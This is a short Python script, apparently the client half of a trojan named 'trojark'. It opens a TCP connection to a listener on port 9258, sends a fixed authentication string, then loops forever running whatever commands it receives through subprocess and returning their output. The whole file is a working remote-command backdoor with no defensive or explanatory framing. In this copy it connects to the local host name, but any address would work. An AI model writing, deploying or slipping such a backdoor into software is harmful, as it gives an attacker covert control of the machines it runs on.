import socket
import subprocess

ip = socket.gethostname()
port = 9258

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect((ip, port))

# Validate client
s.send(bytes("trojark", "utf-8"))

# Handle commands
while True:
    cmd_raw = s.recv(1024)
    cmd = cmd_raw.decode("utf-8")

    response = subprocess.run(cmd.split(" "), stdout=subprocess.PIPE)
    if not response.stdout:
        s.send(bytes("done", "utf-8"))
    else:
        s.send(response.stdout)  # Response is already a bytes object
